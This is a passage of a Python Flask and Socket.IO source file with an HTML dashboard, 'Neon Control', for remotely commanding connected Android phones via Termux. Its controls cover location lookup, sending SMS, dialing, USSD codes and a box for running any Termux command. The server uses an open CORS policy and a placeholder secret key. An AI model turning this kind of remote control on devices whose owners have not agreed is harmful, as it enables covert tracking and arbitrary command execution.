#!/usr/bin/env python3
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
import json
import os
from datetime import datetime
from threading import Lock
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'
socketio = SocketIO(app, cors_allowed_origins="*")

# Store connected phones and messages
connected_phones = {}
phone_messages = {}
phone_lock = Lock()
ussd_sessions = {}  # Store active USSD sessions

# Modern Dark UI with Complete CSS + USSD Features
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Neon Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --neon-blue: #00f3ff;
            --neon-purple: #b967ff;
            --neon-pink: #ff2a6d;
            --neon-green: #00ff88;
            --neon-orange: #ff7b00;
            --dark-bg: #0a0a0f;
            --darker-bg: #050508;
            --card-bg: #1a1a2e;
            --card-hover: #252542;
            --text: #ffffff;
            --text-secondary: #b8b8b8;
            --text-muted: #8888aa;
            --success: #00ff88;
            --warning: #ffaa00;
            --danger: #ff2a6d;
            --border-radius: 16px;
            --transition: all 0.3s ease;
        }

        body {
            background: var(--dark-bg);
            color: var(--text);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            line-height: 1.6;
        }

        .glow {
            text-shadow: 0 0 10px var(--neon-blue), 0 0 20px var(--neon-blue), 0 0 30px rgba(0, 243, 255, 0.3);
        }

        .glow-purple {
            text-shadow: 0 0 10px var(--neon-purple), 0 0 20px var(--neon-purple), 0 0 30px rgba(185, 103, 255, 0.3);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            padding: 40px 0;
            background: linear-gradient(135deg, var(--darker-bg) 0%, var(--card-bg) 100%);
            border-radius: var(--border-radius);
            margin-bottom: 30px;
            border: 1px solid rgba(0, 243, 255, 0.1);
            position: relative;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 243, 255, 0.1), transparent);
            animation: shine 6s infinite;
            animation-delay: 2s;
        }

        @keyframes shine {
            0% { left: -100%; }
            20% { left: 100%; }
            100% { left: 100%; }
        }

        .header h1 {
            font-size: 4em;
            margin-bottom: 15px;
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple), var(--neon-pink));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 900;
            letter-spacing: 2px;
        }

        .header .subtitle {
            font-size: 1.3em;
            color: var(--text-secondary);
            font-weight: 300;
            letter-spacing: 1px;
        }

        .dashboard {
            display: grid;
            grid-template-columns: 380px 1fr;
            gap: 30px;
            min-height: 70vh;
        }

        .sidebar {
            background: var(--card-bg);
            border-radius: var(--border-radius);
            padding: 30px;
            border: 1px solid rgba(0, 243, 255, 0.1);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
        }

        .main-content {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        .devices-section h3 {
            color: var(--neon-blue);
            margin-bottom: 25px;
            font-size: 1.5em;
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700;
        }

        .devices-section h3 i {
            font-size: 1.2em;
        }

        .device-list {
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .device-card {
            background: linear-gradient(135deg, var(--card-bg), #252542);
            padding: 22px;
            border-radius: 14px;
            border-left: 5px solid var(--neon-blue);
            transition: var(--transition);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }

        .device-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 243, 255, 0.1), transparent);
            transition: left 0.5s ease;
        }

        .device-card:hover::before {
            left: 100%;
        }

        .device-card:hover {
            transform: translateY(-5px) scale(1.02);
            box-shadow: 0 15px 30px rgba(0, 243, 255, 0.25);
            border-left-color: var(--neon-purple);
            background: linear-gradient(135deg, #252542, #2d2d5a);
        }

        .device-card.selected {
            border-left-color: var(--neon-green);
            background: linear-gradient(135deg, #1a2e2a, #253542);
            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
        }

        .device-card.offline {
            border-left-color: #666;
            opacity: 0.5;
            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
        }

        .device-card.offline:hover {
            transform: none;
            box-shadow: none;
            border-left-color: #666;
        }

        .device-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .device-name {
            font-weight: 700;
            font-size: 1.1em;
            color: var(--text);
        }

        .device-status {
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-online {
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
            color: var(--dark-bg);
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
        }

        .status-offline {
            background: #666;
            color: var(--text);
        }

        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
            margin-top: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, var(--card-bg), #252542);
            padding: 25px;
            border-radius: 14px;
            text-align: center;
            border: 1px solid rgba(0, 243, 255, 0.1);
            transition: var(--transition);
        }

        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.2);
            border-color: rgba(0, 243, 255, 0.3);
        }

        .stat-number {
            font-size: 2.5em;
            font-weight: 900;
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1;
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 0.95em;
            margin-top: 8px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .control-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .panel {
            background: var(--card-bg);
            border-radius: var(--border-radius);
            padding: 30px;
            border: 1px solid rgba(0, 243, 255, 0.1);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
            transition: var(--transition);
        }

        .panel:hover {
            border-color: rgba(0, 243, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }

        .panel-title {
            color: var(--neon-blue);
            margin-bottom: 25px;
            font-size: 1.4em;
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700;
        }

        .panel-title i {
            font-size: 1.2em;
        }

        .dialer {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 25px 0;
        }

        .dial-btn {
            padding: 22px;
            font-size: 1.5em;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, var(--card-bg), #252542);
            color: var(--text);
            cursor: pointer;
            transition: var(--transition);
            font-weight: bold;
            border: 1px solid rgba(0, 243, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        .dial-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 243, 255, 0.1), transparent);
            transition: left 0.5s ease;
        }

        .dial-btn:hover::before {
            left: 100%;
        }

        .dial-btn:hover {
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
            color: var(--dark-bg);
            transform: scale(1.05);
            border-color: transparent;
            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.3);
        }

        .number-display {
            background: var(--darker-bg);
            border: 2px solid rgba(0, 243, 255, 0.3);
            border-radius: 12px;
            padding: 18px;
            font-size: 1.4em;
            text-align: center;
            margin: 20px 0;
            color: var(--neon-blue);
            font-weight: bold;
            font-family: 'Courier New', monospace;
            letter-spacing: 2px;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: var(--transition);
        }

        .number-display:empty::before {
            content: 'Enter number...';
            color: var(--text-muted);
            font-weight: normal;
        }

        .action-buttons {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: var(--transition);
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 10px;
            justify-content: center;
            flex: 1;
            font-size: 1em;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn-primary {
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            color: var(--dark-bg);
            box-shadow: 0 5px 15px rgba(0, 243, 255, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.4);
        }

        .btn-secondary {
            background: linear-gradient(135deg, var(--card-bg), #252542);
            color: var(--text);
            border: 1px solid rgba(0, 243, 255, 0.3);
        }

        .btn-secondary:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.2);
            border-color: var(--neon-blue);
        }

        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 15px;
            margin: 25px 0;
        }

        .action-btn {
            background: linear-gradient(135deg, var(--card-bg), #252542);
            border: 1px solid rgba(0, 243, 255, 0.2);
            color: var(--text);
            padding: 20px;
            border-radius: 12px;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            position: relative;
            overflow: hidden;
        }

        .action-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 243, 255, 0.1), transparent);
            transition: left 0.5s ease;
        }

        .action-btn:hover::before {
            left: 100%;
        }

        .action-btn:hover {
            border-color: var(--neon-blue);
            transform: translateY(-5px) scale(1.05);
            box-shadow: 0 15px 30px rgba(0, 243, 255, 0.25);
        }

        .action-btn i {
            font-size: 1.8em;
            color: var(--neon-blue);
            transition: var(--transition);
        }

        .action-btn:hover i {
            color: var(--neon-purple);
            transform: scale(1.2);
        }

        .action-btn span {
            font-weight: 600;
            font-size: 0.95em;
        }

        .input-group {
            margin: 20px 0;
        }

        .input-group label {
            display: block;
            margin-bottom: 10px;
            color: var(--text-secondary);
            font-weight: 600;
            font-size: 0.95em;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .input-group input, .input-group textarea, .input-group select {
            width: 100%;
            padding: 16px;
            background: var(--darker-bg);
            border: 2px solid rgba(0, 243, 255, 0.3);
            border-radius: 10px;
            color: var(--text);
            font-size: 1em;
            transition: var(--transition);
            font-family: inherit;
        }

        .input-group input:focus, .input-group textarea:focus, .input-group select:focus {
            outline: none;
            border-color: var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
            background: var(--card-bg);
        }

        .input-group input::placeholder, .input-group textarea::placeholder {
            color: var(--text-muted);
        }

        .sms-section {
            grid-column: 1 / -1;
        }

        .messages-panel {
            background: var(--darker-bg);
            border-radius: 12px;
            padding: 25px;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid rgba(0, 243, 255, 0.2);
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .message {
            padding: 20px;
            border-radius: 12px;
            background: rgba(0, 243, 255, 0.05);
            border-left: 4px solid var(--neon-blue);
            transition: var(--transition);
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .message:hover {
            background: rgba(0, 243, 255, 0.1);
            transform: translateX(5px);
        }

        .message-time {
            font-size: 0.85em;
            color: var(--neon-blue);
            margin-bottom: 8px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .message-content {
            color: var(--text);
            line-height: 1.5;
            word-wrap: break-word;
        }

        .live-feed {
            background: var(--darker-bg);
            color: var(--neon-blue);
            padding: 25px;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            height: 250px;
            overflow-y: auto;
            border: 2px solid rgba(0, 243, 255, 0.3);
            margin: 20px 0;
            line-height: 1.4;
            font-size: 0.95em;
        }

        .live-feed::before {
            content: '> ';
            color: var(--neon-green);
        }

        .notification {
            position: fixed;
            top: 30px;
            right: 30px;
            padding: 20px 30px;
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            color: var(--dark-bg);
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0, 243, 255, 0.4);
            transform: translateX(500px);
            transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            z-index: 10000;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 12px;
            max-width: 400px;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification.success {
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
        }

        .notification.danger {
            background: linear-gradient(45deg, var(--neon-pink), var(--neon-orange));
        }

        .tab-container {
            background: var(--card-bg);
            border-radius: var(--border-radius);
            padding: 30px;
            border: 1px solid rgba(0, 243, 255, 0.1);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
        }

        .tabs {
            display: flex;
            background: var(--darker-bg);
            border-radius: 12px;
            padding: 6px;
            margin-bottom: 30px;
            border: 1px solid rgba(0, 243, 255, 0.2);
        }

        .tab {
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            flex: 1;
            color: var(--text-secondary);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-size: 0.95em;
        }

        .tab.active {
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            color: var(--dark-bg);
            box-shadow: 0 5px 15px rgba(0, 243, 255, 0.3);
        }

        .tab:hover:not(.active) {
            color: var(--neon-blue);
            background: rgba(0, 243, 255, 0.1);
        }

        .tab-content {
            display: none;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .tab-content.active {
            display: block;
        }

        .custom-command {
            display: flex;
            gap: 15px;
            margin-top: 25px;
        }

        .custom-command input {
            flex: 1;
        }

        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--darker-bg);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
            border-radius: 5px;
            border: 2px solid var(--darker-bg);
        }

        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(45deg, var(--neon-purple), var(--neon-pink));
        }

        /* Responsive Design */
        @media (max-width: 1200px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
            
            .control-grid {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 3em;
            }
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .header {
                padding: 30px 0;
            }
            
            .header h1 {
                font-size: 2.5em;
            }
            
            .panel {
                padding: 20px;
            }
            
            .dialer {
                gap: 10px;
            }
            
            .dial-btn {
                padding: 18px;
                font-size: 1.3em;
            }
            
            .quick-actions {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        /* Loading animation */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0, 243, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--neon-blue);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Empty states */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: var(--text-muted);
        }

        .empty-state i {
            font-size: 4em;
            margin-bottom: 20px;
            opacity: 0.5;
        }

        .empty-state p {
            font-size: 1.1em;
            line-height: 1.6;
        }

        /* Connection status */
        .connection-status {
            position: fixed;
            bottom: 20px;
            left: 20px;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 0.9em;
            font-weight: 600;
            z-index: 1000;
            display: flex;
            align-items: center;
            gap: 8px;
            backdrop-filter: blur(10px);
        }

        .connection-status.connected {
            background: rgba(0, 255, 136, 0.2);
            color: var(--neon-green);
            border: 1px solid rgba(0, 255, 136, 0.3);
        }

        .connection-status.disconnected {
            background: rgba(255, 42, 109, 0.2);
            color: var(--neon-pink);
            border: 1px solid rgba(255, 42, 109, 0.3);
        }

        /* USSD Specific Styles */
        .ussd-session {
            background: linear-gradient(135deg, #1a2e2a, #253542);
            border: 2px solid var(--neon-green);
            border-radius: var(--border-radius);
            padding: 25px;
            margin: 20px 0;
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.2);
            animation: slideInUp 0.5s ease;
        }
        
        @keyframes slideInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .ussd-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(0, 255, 136, 0.3);
        }
        
        .ussd-title {
            color: var(--neon-green);
            font-size: 1.3em;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .ussd-close {
            background: var(--danger);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9em;
            transition: var(--transition);
        }
        
        .ussd-close:hover {
            background: #ff1a5e;
            transform: scale(1.05);
        }
        
        .ussd-display {
            background: var(--darker-bg);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            color: var(--neon-green);
            line-height: 1.6;
            white-space: pre-wrap;
            min-height: 100px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .ussd-input-group {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }
        
        .ussd-input {
            flex: 1;
            padding: 15px;
            background: var(--darker-bg);
            border: 2px solid rgba(0, 255, 136, 0.3);
            border-radius: 10px;
            color: var(--neon-green);
            font-family: 'Courier New', monospace;
            font-size: 1.1em;
        }
        
        .ussd-input:focus {
            outline: none;
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        
        .ussd-send {
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
            color: var(--dark-bg);
            border: none;
            padding: 15px 25px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 700;
            transition: var(--transition);
        }
        
        .ussd-send:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.4);
        }
        
        .ussd-quick-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }
        
        .ussd-option {
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.3);
            color: var(--neon-green);
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            text-align: center;
            transition: var(--transition);
            font-weight: 600;
        }
        
        .ussd-option:hover {
            background: rgba(0, 255, 136, 0.2);
            transform: scale(1.05);
            border-color: var(--neon-green);
        }
        
        .ussd-status {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 15px;
            background: rgba(0, 243, 255, 0.1);
            border-radius: 8px;
            margin-bottom: 15px;
            font-size: 0.9em;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--neon-green);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- Connection Status -->
    <div class="connection-status connected" id="connectionStatus">
        <i class="fas fa-wifi"></i>
        <span>CONNECTED TO SERVER</span>
    </div>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1 class="glow">NEON CONTROL</h1>
            <div class="subtitle">Advanced Mobile Device Management + USSD</div>
        </div>

        <!-- Main Dashboard -->
        <div class="dashboard">
            <!-- Sidebar -->
            <div class="sidebar">
                <div class="devices-section">
                    <h3><i class="fas fa-satellite-dish"></i> CONNECTED DEVICES</h3>
                    <div class="device-list" id="phoneList">
                        <div class="device-card offline">
                            <div class="device-info">
                                <div class="device-name">No devices connected</div>
                                <div class="device-status status-offline">OFFLINE</div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number" id="connectedCount">0</div>
                        <div class="stat-label">DEVICES ONLINE</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number" id="totalCommands">0</div>
                        <div class="stat-label">COMMANDS SENT</div>
                    </div>
                </div>
            </div>

            <!-- Main Content -->
            <div class="main-content">
                <!-- Device Selection -->
                <div class="panel">
                    <div class="panel-title">
                        <i class="fas fa-microchip"></i> DEVICE SELECTION
                    </div>
                    <div class="input-group">
                        <select id="phoneSelect">
                            <option value="">-- SELECT DEVICE --</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <div class="number-display" id="selectedDeviceInfo">No device selected</div>
                    </div>
                </div>

                <!-- USSD Session Display -->
                <div id="ussdSessionContainer"></div>

                <!-- Control Grid -->
                <div class="control-grid">
                    <!-- Dialer Panel -->
                    <div class="panel">
                        <div class="panel-title">
                            <i class="fas fa-phone"></i> DIALER & USSD
                        </div>
                        <div class="dialer">
                            <button class="dial-btn" onclick="addNumber('1')">1</button>
                            <button class="dial-btn" onclick="addNumber('2')">2</button>
                            <button class="dial-btn" onclick="addNumber('3')">3</button>
                            <button class="dial-btn" onclick="addNumber('4')">4</button>
                            <button class="dial-btn" onclick="addNumber('5')">5</button>
                            <button class="dial-btn" onclick="addNumber('6')">6</button>
                            <button class="dial-btn" onclick="addNumber('7')">7</button>
                            <button class="dial-btn" onclick="addNumber('8')">8</button>
                            <button class="dial-btn" onclick="addNumber('9')">9</button>
                            <button class="dial-btn" onclick="addNumber('*')">*</button>
                            <button class="dial-btn" onclick="addNumber('0')">0</button>
                            <button class="dial-btn" onclick="addNumber('#')">#</button>
                        </div>
                        <div class="number-display" id="phoneNumber"></div>
                        <div class="action-buttons">
                            <button class="btn btn-primary" onclick="dialNumber()">
                                <i class="fas fa-phone"></i> DIAL
                            </button>
                            <button class="btn btn-secondary" onclick="clearNumber()">
                                <i class="fas fa-eraser"></i> CLEAR
                            </button>
                            <button class="btn btn-primary" onclick="startUSSD()" style="background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));">
                                <i class="fas fa-broadcast-tower"></i> USSD
                            </button>
                        </div>
                        
                        <!-- Quick USSD Codes -->
                        <div class="quick-actions" style="margin-top: 20px;">
                            <div class="action-btn" onclick="loadUSSDCode('*121#')" style="border-color: var(--neon-green);">
                                <i class="fas fa-coins"></i>
                                <span>Balance</span>
                            </div>
                            <div class="action-btn" onclick="loadUSSDCode('*131*4#')" style="border-color: var(--neon-green);">
                                <i class="fas fa-sim-card"></i>
                                <span>Data</span>
                            </div>
                            <div class="action-btn" onclick="loadUSSDCode('*123#')" style="border-color: var(--neon-green);">
                                <i class="fas fa-gift"></i>
                                <span>Offers</span>
                            </div>
                        </div>
                    </div>

                    <!-- Quick Actions -->
                    <div class="panel">
                        <div class="panel-title">
                            <i class="fas fa-bolt"></i> QUICK ACTIONS
                        </div>
                        <div class="quick-actions">
                            <div class="action-btn" onclick="sendCommand('termux-vibrate -d 1000')">
                                <i class="fas fa-vibration"></i>
                                <span>Vibrate</span>
                            </div>
                            <div class="action-btn" onclick="sendCommand('termux-toast \"Control Active\"')">
                                <i class="fas fa-comment"></i>
                                <span>Toast</span>
                            </div>
                            <div class="action-btn" onclick="sendCommand('termux-battery-status')">
                                <i class="fas fa-battery-half"></i>
                                <span>Battery</span>
                            </div>
                            <div class="action-btn" onclick="sendCommand('termux-location')">
                                <i class="fas fa-location-arrow"></i>
                                <span>Location</span>
                            </div>
                            <div class="action-btn" onclick="sendCommand('termux-notification --title \"Alert\" --content \"From Control\"')">
                                <i class="fas fa-bell"></i>
                                <span>Notify</span>
                            </div>
                            <div class="action-btn" onclick="sendCommand('termux-brightness 255')">
                                <i class="fas fa-sun"></i>
                                <span>Brightness</span>
                            </div>
                        </div>
                    </div>

                    <!-- SMS Panel -->
                    <div class="panel sms-section">
                        <div class="panel-title">
                            <i class="fas fa-comment-sms"></i> SMS MESSAGING
                        </div>
                        <div class="input-group">
                            <input type="text" id="smsNumber" placeholder="Recipient Number (e.g., +1234567890)">
                        </div>
                        <div class="input-group">
                            <textarea id="smsMessage" placeholder="Type your message here..." rows="3"></textarea>
                        </div>
                        <button class="btn btn-primary" onclick="sendSMS()">
                            <i class="fas fa-paper-plane"></i> SEND SMS
                        </button>
                    </div>

                    <!-- Custom Command -->
                    <div class="panel sms-section">
                        <div class="panel-title">
                            <i class="fas fa-terminal"></i> CUSTOM COMMAND
                        </div>
                        <div class="custom-command">
                            <input type="text" id="customCommand" placeholder="Enter any Termux command...">
                            <button class="btn btn-primary" onclick="sendCustomCommand()">
                                <i class="fas fa-play"></i> RUN
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Tabs for Additional Features -->
                <div class="tab-container">
                    <div class="tabs">
                        <div class="tab active" onclick="switchTab('monitor')">DEVICE MONITOR</div>
                        <div class="tab" onclick="switchTab('messages')">MESSAGE LOG</div>
                        <div class="tab" onclick="switchTab('ussd')">USSD HISTORY</div>
                    </div>

                    <!-- Monitor Tab -->
                    <div id="monitor" class="tab-content active">
                        <div class="panel-title">
                            <i class="fas fa-heart-pulse"></i> LIVE MONITOR
                        </div>
                        <div class="live-feed" id="liveFeed">
> System initialized
> Waiting for device connections...
                        </div>
                        <div class="action-buttons">
                            <button class="btn btn-secondary" onclick="sendCommand('termux-info')">
                                <i class="fas fa-info-circle"></i> DEVICE INFO
                            </button>
                            <button class="btn btn-secondary" onclick="sendCommand('termux-sensor -l')">
                                <i class="fas fa-microchip"></i> LIST SENSORS
                            </button>
                        </div>
                    </div>

                    <!-- Messages Tab -->
                    <div id="messages" class="tab-content">
                        <div class="panel-title">
                            <i class="fas fa-comments"></i> MESSAGE LOG
                        </div>
                        <div class="messages-panel" id="messagesPanel">
                            <div class="empty-state">
                                <i class="fas fa-inbox"></i>
                                <p>No messages yet.<br>Commands and responses will appear here.</p>
                            </div>
                        </div>
                    </div>
                    
                    <!-- USSD History Tab -->
                    <div id="ussd" class="tab-content">
                        <div class="panel-title">
                            <i class="fas fa-broadcast-tower"></i> USSD HISTORY
                        </div>
                        <div class="messages-panel" id="ussdHistoryPanel">
                            <div class="empty-state">
                                <i class="fas fa-broadcast-tower"></i>
                                <p>No USSD sessions yet.<br>USSD interactions will appear here.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Notification -->
    <div class="notification" id="notification">
        <i class="fas fa-check-circle"></i> Command sent successfully!
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let phones = [];
        let commandCount = 0;
        let selectedPhone = '';
        let activeUSSD = null;
        
        // Socket events
        socket.on('connect', function() {
            showNotification('Connected to server', 'success');
            updateConnectionStatus(true);
        });
        
        socket.on('disconnect', function() {
            updateConnectionStatus(false);
            showNotification('Disconnected from server', 'danger');
        });
        
        socket.on('phone_list_update', function(phoneList) {
            phones = phoneList;
            updatePhoneDisplay();
        });
        
        socket.on('new_message', function(data) {
            addMessageToPanel(data.phone_id, data.message, data.timestamp);
        });
        
        socket.on('command_response', function(data) {
            addToLiveFeed(`> ${data.phone_id}: ${data.response}`);
        });
        
        // USSD Events
        socket.on('ussd_session_start', function(data) {
            activeUSSD = data.session_id;
            showUSSDInterface(data);
        });
        
        socket.on('ussd_update', function(data) {
            updateUSSDDisplay(data);
        });
        
        socket.on('ussd_session_end', function(data) {
            endUSSDInterface(data);
        });
        
        // UI Functions
        function switchTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }
        
        function updatePhoneDisplay() {
            const phoneList = document.getElementById('phoneList');
            const phoneSelect = document.getElementById('phoneSelect');
            
            document.getElementById('connectedCount').textContent = phones.length;
            document.getElementById('totalCommands').textContent = commandCount;
            
            if (phones.length === 0) {
                phoneList.innerHTML = `
                    <div class="device-card offline">
                        <div class="device-info">
                            <div class="device-name">No devices connected</div>
                            <div class="device-status status-offline">OFFLINE</div>
                        </div>
                    </div>`;
            } else {
                phoneList.innerHTML = phones.map(phone => `
                    <div class="device-card ${selectedPhone === phone ? 'selected' : ''}" onclick="selectPhone('${phone}')">
                        <div class="device-info">
                            <div class="device-name">${phone}</div>
                            <div class="device-status status-online">ONLINE</div>
                        </div>
                    </div>`).join('');
            }
            
            const currentSelected = phoneSelect.value;
            const options = '<option value="">-- SELECT DEVICE --</option>' + 
                phones.map(phone => `<option value="${phone}" ${selectedPhone === phone ? 'selected' : ''}>${phone}</option>`).join('');
            phoneSelect.innerHTML = options;
            
            // Restore selection if it still exists
            if (phones.includes(selectedPhone)) {
                phoneSelect.value = selectedPhone;
            } else if (phones.length > 0) {
                // Auto-select first device if none selected
                selectPhone(phones[0]);
